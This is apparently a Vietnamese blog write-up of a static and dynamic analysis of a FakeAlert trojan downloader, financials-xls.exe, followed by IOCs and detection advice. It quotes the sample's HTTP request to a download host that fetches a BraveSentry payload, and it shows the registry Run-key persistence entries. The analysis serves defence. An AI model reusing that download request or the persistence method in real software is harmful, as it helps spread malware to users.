---
title: Financials-xls.exe
date: 2025-08-05 11:30:00 +0700
categories: [Malware Analysis, Dynamic]
tags: [persistence, fakealert, trojan, downloader]
description: Phân tích hành vi của mẫu mã độc financials-xls.exe – dạng trojan FakeAlert, có persistence và khả năng tải xuống BraveSentry.
---


## 🎯 Mục tiêu

- Phân tích tĩnh & động mẫu `financials-xls.exe`
- Ghi nhận IOC và chuỗi hành vi: persistence + downloader (FakeAlert / scareware)
- Đưa ra khuyến nghị phát hiện & ứng phó

---

## 🧊 1. Phân tích tĩnh

**File name:** `financials-xls.exe`

**MD5:** `27599c22e0eba42f3e91e27fe1d04598`

**Đánh giá ban đầu (VirusTotal):** Trojan.FakeAlert

### 🔹 VirusTotal / cảnh báo

![VirusTotal detection](/resources/Financials-xls/Pasted%20image%2020251001113548.png)

### 🔹 EXEinfoPE — Packed, GUI, 32-bit
- EXE báo **32-bit, GUI, packed**.
- Dùng UPX để unpack thành công → chuyển sang phân tích tĩnh sâu hơn.

![EXEinfoPE](/resources/Financials-xls/Pasted%20image%2020251001101000.png)

![UPX unpacked](/resources/Financials-xls/Pasted%20image%2020251001101205.png)

### 🔹 PeStudio — Indicators / Imports / Sections
#### Indicators (cần chú ý)
![PeStudio Indicators](/resources/Financials-xls/Pasted%20image%2020251001101313.png)

- File có signature `Installer VISE Custom` (level 1 cảnh báo).
- Section `.text` được đánh dấu **writable** và **self-modifying** → khả năng runtime patching.
- Thư viện mạng (Windows Sockets) xuất hiện → khả năng sử dụng socket.

#### Import table
![PeStudio Imports](/resources/Financials-xls/Pasted%20image%2020251001101444.png)

- Import nhiều API liên quan đến **network**, **registry**, **process**, **UI/notification** → tương thích với hành vi downloader + persistence + fake alert.

#### Strings — dấu hiệu downloader / fake alert
![PeStudio Strings](/resources/Financials-xls/Pasted%20image%2020251001101927.png)

Một số chuỗi nổi bật (biên tập để dễ đọc):

- `GET /download.php?&advid=00000717&u=%u&p=%u HTTP/1.0\r\nHost: download.bravesentry.com\r\n\r\n`
- `GET http://download.bravesentry.com/download.php?&advid=00000717&u=%u&p=%u HTTP/1.0\r\nHost: download.bravesentry.com\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n`
- Thông tin đường dẫn & tên ứng dụng giả: `C:\Program Files\BraveSentry\BraveSentry.exe`
- IP liên quan: `69.50.175.181`

→ Rất có khả năng đây là **downloader/dropper** cho BraveSentry (rogue software / scareware).

Một số chuỗi HTML/template cảnh báo giả cũng được tìm thấy (dùng để hiển thị fake alert).
![HTML template & other strings](/resources/Financials-xls/Pasted%20image%2020251001112935.png)

---

## ⚙️ 2. Phân tích động

> Lup-run trong môi trường cô lập (VM), bật ProcMon / Regshot / network capture (Fakenet) để quan sát.

### 🔸 1) Hiện cảnh báo giả (Fake Alert GUI)
Khi chạy, ứng dụng hiện cửa sổ cảnh báo/giả mạo (scareware) để dụ người dùng tương tác / click.
![Fake Alert Window](/resources/Financials-xls/Pasted%20image%2020251001114452.png)

### 🔸 2) Tải payload từ remote (downloader behavior)
Quan sát network: chương trình thực hiện request tới `download.bravesentry.com` để tải về payload (BraveSentry.exe hoặc tương tự).

![Network request to BraveSentry](/resources/Financials-xls/Pasted%20image%2020251001114626.png)

**Mẫu request:**
```

GET /download.php?&advid=00000717&u=<user>&p=<pass> HTTP/1.0
Host: download.bravesentry.com
Pragma: no-cache
Cache-Control: no-cache

```

→ mục tiêu tải chương trình giả mạo/installer xuống và có thể thực thi nó.

### 🔸 3) Persistence — registry Run keys (Regshot)
Regshot diff cho thấy malware ghi các Run entries:

![Regshot diff](/resources/Financials-xls/Pasted%20image%2020251001115031.png)

- `HKU\<sid>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows update loader` → `"C:\Windows\xpupdate.exe"`
- `HKU\<sid>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\con` → `"C:\Users\COMPUTER\Desktop\malware-sample\financials-xls2.exe"`

→ Malware cố gắng thiết lập autostart qua `Run` để duy trì persistence.

### 🔸 4) File artifacts (drop)
Các file được tạo / copy:

- `C:\Users\COMPUTER\AppData\Roaming\Install.dat`
- `C:\Windows\xupdate.exe` (cùng hash với binary gốc `financials-xls.exe`)

> Ghi vào `C:\Windows` thường yêu cầu **quyền Administrator**, cho thấy malware cố gắng leo thang hoặc yêu cầu quyền cao hơn.

### 🔸 5) ProcMon timeline — sơ đồ hành vi
ProcMon trace phác thảo luồng hành vi:

![ProcMon behavior diagram](/resources/Financials-xls/Pasted%20image%2020251001121636.png)

Tóm tắt:

- Process `financials-xls2.exe` khởi chạy → spawn 2 thread chính.
  - Thread A: tạo/ghi Run key `Windows update loader` → point tới `C:\Windows\xpupdate.exe`.
  - Thread B: tạo `Install.dat` trong AppData → có thể chứa config hoặc payload giai đoạn 2.
- Bên cạnh đó, process thực hiện HTTP request tới `download.bravesentry.com` để tải payload.

---

## 🚨 Kết luận

### ✅ Tóm tắt hành vi chính
- **Loại mã độc:** Trojan downloader / FakeAlert (scareware) — mục tiêu dụ người dùng cài phần mềm giả mạo.
- **Persistence:** Thiết lập Run key (`Windows update loader`, `con`) để tự khởi động sau login.
- **Drop & Copy:** Ghi bản sao vào `C:\Windows\xupdate.exe` (same hash), tạo `Install.dat` trong AppData.
- **Network:** Request tới `download.bravesentry.com` (`69.50.175.181`) để tải BraveSentry hoặc các payload phụ.
- **Quyền:** Hành vi ghi vào `C:\Windows` gợi ý cần quyền admin.

### 🎯 Mức độ rủi ro
- Trung bình → cao: có persistence và tải thêm mã độc (kịch bản multi-stage).
- Nếu payload thứ cấp có backdoor/RAT thì rủi ro sẽ tăng rất cao.

---

## 📌 IOC (Indicators of Compromise)

| Loại               | Giá trị                                                                                                                                                   |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| File name          | `financials-xls.exe`                                                                                                                                      |
| MD5                | `27599c22e0eba42f3e91e27fe1d04598`                                                                                                                        |
| C2 / Download host | `download.bravesentry.com`                                                                                                                                |
| C2 IP              | `69.50.175.181`                                                                                                                                           |
| File drops         | `C:\Windows\xpupdate.exe` (same hash as original) <br> `C:\Users\<user>\AppData\Roaming\Install.dat`                                                      |
| Registry keys      | `HKCU\...\Run\Windows update loader` = `C:\Windows\xpupdate.exe` <br> `HKCU\...\Run\con` = `C:\Users\COMPUTER\Desktop\malware-sample\financials-xls2.exe` |

---

## 🛡️ Khuyến nghị ứng phó & phát hiện

- **Chặn** domain `download.bravesentry.com` và IP `69.50.175.181` trên firewall/proxy.
- **Quét** hệ thống tìm file `xpupdate.exe` trong `C:\Windows` và file `Install.dat` trong AppData → cách ly & hash-check.
- **Kiểm tra registry**: tìm các Run entries có tên lạ như `Windows update loader`, `con` và xóa/cách ly.
- **Thu thập** memory dump & network capture nếu phát hiện tiến trình đang chạy để phân tích payload thứ cấp.
- **Cảnh báo người dùng**: không chạy file đính kèm từ nguồn không rõ; cảnh báo về các cửa sổ “scan/alert” yêu cầu cài phần mềm.

---
